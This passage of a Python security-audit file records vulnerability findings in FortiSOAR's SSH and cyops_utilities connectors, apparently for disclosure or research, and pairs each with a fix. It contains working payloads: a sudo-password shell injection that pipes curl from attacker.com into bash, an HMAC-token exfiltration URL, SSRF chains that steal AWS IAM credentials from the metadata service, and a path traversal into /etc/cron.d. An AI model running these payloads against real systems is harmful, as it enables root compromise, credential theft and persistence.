#     /bin/sh -c 'echo P@ss; curl http://attacker.com/shell.sh | bash; echo | sudo <cmd>'
#
#   Attack precondition: FortiSOAR user with connector config edit rights.
#   Impact: arbitrary OS command execution as root on the remote SSH target.
#   This is scope-changed -- the FortiSOAR connector is the vulnerable component,
#   but compromise lands on the external SSH server.
#   CVSS: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 9.9 CRITICAL (CWE-78)
#
# Sub-finding C: private key SSRF via make_request (CWE-918)
#   builtins.py:23-26:
#     if config.get('private_key', {}).get('@type') == "File":
#         url = config.get('private_key', {}).get('@id')
#         config["private_key"] = make_request(url, 'GET')
#
#   make_request() is integrations.crudhub.make_request -- FortiSOAR's authenticated
#   internal API client. The '@id' URL comes from user-controlled connector config.
#   If URL validation is absent (unconfirmed -- make_request source not yet extracted),
#   attacker can set '@id' to an internal service URL to exfiltrate data:
#   - http://169.254.169.254/latest/meta-data/ (EC2 IMDSv1 credential theft)
#   - http://localhost:5432/ (PostgreSQL banner)
#   - http://localhost:15672/ (RabbitMQ management API)
#   The private key content is returned to the FortiSOAR API response and visible
#   to the attacker via playbook output.
#   CVSS (pending make_request validation check): AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 HIGH
#   CWE-918: Server-Side Request Forgery
#
# Note: run_sftp_copy() contains a latent bug -- sftp.putfo(file_obj, remote_path + uuid.uuid4())
#   will raise TypeError in Python 3 (str + UUID). Function is dead code / broken.

FSR_F18_SSH_CONNECTOR_VULNERABILITIES = {
    "id": "FSR-F18",
    "title": "SSH connector -- AutoAddPolicy MITM, super_user_password shell injection, private key SSRF",
    "severity": "CRITICAL",
    "cvss": "9.9",
    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    "cwe": "CWE-78, CWE-295, CWE-918",
    "component": "cyops-connector-ssh v2.1.3",
    "source_file": "builtins.py:59,116,26",
    "copyright": "2008-2026 Fortinet Inc. (actively maintained)",

    "sub_findings": {
        "F18a": {
            "title": "AutoAddPolicy -- no SSH host key verification",
            "cwe": "CWE-295",
            "cvss": "6.8",
            "cvss_vector": "AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "location": "builtins.py:59",
            "evidence": "client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())",
            "developer_note": "FIXME: there should probably be some verification here instead of blindly adding to known_hosts",
            "impact": "MITM attacker intercepts SSH session; receives credentials, all commands, all output",
        },
        "F18b": {
            "title": "super_user_password shell injection on remote SSH target",
            "cwe": "CWE-78",
            "cvss": "9.9",
            "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
            "location": "builtins.py:116",
            "evidence": "cmd = 'echo ' + config.get('super_user_password') + ' | sudo ' + cmd",
            "payload": "P@ss; curl http://attacker.com/shell.sh | bash; echo",
            "impact": "Arbitrary root command execution on remote SSH target via sudo",
            "precondition": "FortiSOAR user with SSH connector config edit rights",
        },
        "F18c": {
            "title": "Private key fetch SSRF via make_request",
            "cwe": "CWE-918",
            "cvss": "6.5",
            "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
            "location": "builtins.py:26",
            "evidence": "config['private_key'] = make_request(config['private_key']['@id'], 'GET')",
            "internal_targets": ["http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                                  "http://localhost:5432/", "http://localhost:15672/"],
            "status": "PLAUSIBLE -- make_request URL validation not yet confirmed",
        },
    },

    "fix": (
        "F18a: Replace AutoAddPolicy with RejectPolicy or known-hosts file validation. "
        "F18b: Use subprocess list form instead of shell string: "
        "['/bin/sudo', '-S', cmd] with password piped to stdin separately. "
        "F18c: Validate that private_key @id URL is a FortiSOAR-local IRI (starts with /api/3/files/)."
    ),
}

# FSR-F19: cyops_utilities -- api_call / make_fcp_request SSRF (CWE-918)
# Component: cyops-connector-cyops_utilities v3.7.2 (http.py, crudhub.py)
# cs_approved: True, publisher: Fortinet
# Copyright: 2008-2026 Fortinet Inc.
#
# Operations exposed: api_call ("Make REST API Call"), make_fcp_request ("Make API Call")
# Both operations are available to ANY FortiSOAR user with playbook execution rights.
#
# api_call (http.py:24-47):
#   requests.request(method, url, **request_args)
#   - `url` = fully user-controlled, no scheme/host validation
#   - `method` = fully user-controlled (GET/POST/PUT/DELETE/CONNECT/etc.)
#   - `verify` = user-controlled SSL bypass (default True, but user can set False)
#   - Response returned directly to playbook step output (JSON or bytes)
#
# make_fcp_request (crudhub.py:448-458):
#   make_request(url=url, method=method, body=body)
#   - `url` = fully user-controlled
#   - make_request() adds FortiSOAR HMAC authentication headers to outbound request
#   - If URL is attacker-controlled, the HMAC token is leaked to the attacker
#   - Attacker can replay the HMAC token against FortiSOAR's internal API
#   - If URL is an internal service, request carries FortiSOAR auth credentials
#
# EC2 IMDSv1 credential theft chain (confirmed viable by aws-commands connector design):
#   1. api_call(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/')
#      -> returns IAM role name
#   2. api_call(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>')
#      -> returns AccessKeyId, SecretAccessKey, Token
#
# Internal service enumeration:
#   - http://localhost:5432/ -> PostgreSQL banner
#   - http://localhost:15672/api/nodes -> RabbitMQ management (if management plugin active)
#   - http://localhost:27017/ -> MongoDB banner
#   - http://localhost:9978/ -> ChromaDB HTTP API (if running)
#   - http://localhost:10447/ -> AI assistant listener (FSR-F13 link)

FSR_F19_CYOPS_UTILITIES_SSRF = {
    "id": "FSR-F19",
    "title": "cyops_utilities api_call / make_fcp_request unrestricted SSRF",
    "severity": "HIGH",
    "cvss": "8.3",
    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
    "cwe": "CWE-918",
    "component": "cyops-connector-cyops_utilities v3.7.2",
    "source_files": ["http.py:24", "crudhub.py:448"],
    "cs_approved": True,

    "operations": {
        "api_call": {
            "description": "Unauthenticated SSRF to any URL",
            "payload": "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "impact": "EC2 IAM credential theft; internal service enumeration",
        },
        "make_fcp_request": {
            "description": "Authenticated SSRF -- FortiSOAR HMAC token leaked to target URL",
            "payload": "url=http://attacker.com/collect",
            "impact": "FortiSOAR HMAC token exfiltration for internal API replay",
        },
    },

    "ec2_credential_chain": [
        "api_call(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/')",
        "api_call(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>')",
        "-> returns: AccessKeyId, SecretAccessKey, Token",
    ],

    "fix": (
        "Validate URL scheme (https only). "
        "Maintain allowlist of permitted URL patterns (external TI feeds, configured integrations). "
        "Block RFC 1918 IP ranges and link-local (169.254.0.0/16) at network layer."
    ),
}

# FSR-F20: cyops_utilities -- xor_byte_file_decryption arbitrary write to /tmp/<output_file>
# Component: cyops-connector-cyops_utilities v3.7.2 (files.py:682-706)
# CWE-22: Path traversal on output file destination
#
# Vulnerable code (files.py:695-698):
#   temp_target_filename = os.path.join("/tmp/", output_file)
#   file = open(temp_target_filename, "w")
#   for ch in file_data:
#       xored = ch ^ key_to_decrypt
#       file.write(chr(xored))
#
# No check_file_traversal() call on output_file parameter.
# os.path.join("/tmp/", "../etc/cron.d/malicious") = "/tmp/../etc/cron.d/malicious"
# open() resolves this to /etc/cron.d/malicious (if process has write access).
#
# The written content is the XOR-decrypted input file, one char per byte.
# An attacker controlling both input_file content and key_to_decrypt=0 (XOR with 0 = identity)
# can write arbitrary content to the target path.
# XOR key 0x00 = identity transform; all original bytes preserved.
#
# Note: impact depends on cyops-worker process user privileges.
# If running as a non-root user, /etc/ writes fail.
# However, writes to /opt/cyops/ connector directory, FortiSOAR Python path,
# or any world-writable directory would achieve code persistence.
#
# check_file_traversal uses os.commonprefix() -- known broken:
# os.commonprefix compares character by character, not path component by component.
# If TMP_FILE_ROOT = '/tmp/uploads', then '/tmp/uploads2/malware' passes the check:
#   commonprefix(['/tmp/uploads2/malware', '/tmp/uploads']) == '/tmp/uploads' -> no error
# Actual safe check requires os.path.commonpath() (Python 3.5+) or trailing / comparison.

FSR_F20_CYOPS_UTILITIES_FILE_WRITE = {
    "id": "FSR-F20",
    "title": "cyops_utilities xor_byte_file_decryption path traversal on output_file (no validation)",
    "severity": "HIGH",
    "cvss": "6.3",
    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
    "cwe": "CWE-22",
    "component": "cyops-connector-cyops_utilities v3.7.2",
    "source_file": "files.py:695",

    "root_cause": (
        "xor_byte_file_decryption() passes output_file directly to os.path.join('/tmp/', output_file) "
        "then opens the resulting path for writing. No check_file_traversal() call on output_file. "
        "os.path.join('/tmp/', '../etc/cron.d/malicious') = '/tmp/../etc/cron.d/malicious' "
        "which open() resolves to /etc/cron.d/malicious."
    ),

    "payload": {
        "input_file": "<attacker-controlled file with desired content>",
        "output_file": "../etc/cron.d/pwned",
        "key_to_decrypt": "0x00",
    },

    "secondary_finding": (
        "check_file_traversal() in files.py:380-394 uses os.path.commonprefix() "
        "which is character-prefix comparison, not path-component comparison (CWE-22). "
        "Bypass: if TMP_FILE_ROOT='/tmp/uploads', path '/tmp/uploads2/x' shares prefix. "
        "Fix: replace with os.path.commonpath() (Python 3.5+)."
    ),
}

# FSR-F21: cyops_utilities -- download_file_from_url SSRF + verify=False
# Component: cyops-connector-cyops_utilities v3.7.2 (files.py:68-95)
#
# download_file_from_url(url, ...) -> requests.get(url=iri, stream=True, verify=False)
# - No URL validation, no scheme/host allowlist
# - verify=False hardcoded -- SSL cert not checked, MITM possible
# - Response saved to TMP_FILE_ROOT, filename returned to caller
# - Attacker chain: download_file_from_url(url='http://169.254.169.254/...') -> store in /tmp
#   then download_file_from_cyops to retrieve content -> full SSRF exfil
# - Different from FSR-F19: this SSRF saves response to disk, not direct API response return

FSR_F21_CYOPS_UTILITIES_DOWNLOAD_SSRF = {
    "id": "FSR-F21",
    "title": "cyops_utilities download_file_from_url SSRF with verify=False",
    "severity": "HIGH",
    "cvss": "7.1",
    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-918",
    "component": "cyops-connector-cyops_utilities v3.7.2",
    "source_file": "files.py:68,117",

    "root_cause": (
        "requests.get() called with user-supplied url, verify=False hardcoded. "
        "No URL scheme or host validation. "
        "Response content saved to TMP_FILE_ROOT as uuid filename. "
        "Filename returned in cyops_file_path for downstream retrieval."
    ),

    "exfiltration_chain": [
        "download_file_from_url(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/role')",
        "-> response saved to /tmp/<uuid>",
        "download_file_from_cyops('/api/3/files/<uuid>') -> returns file content to playbook output",
    ],
}
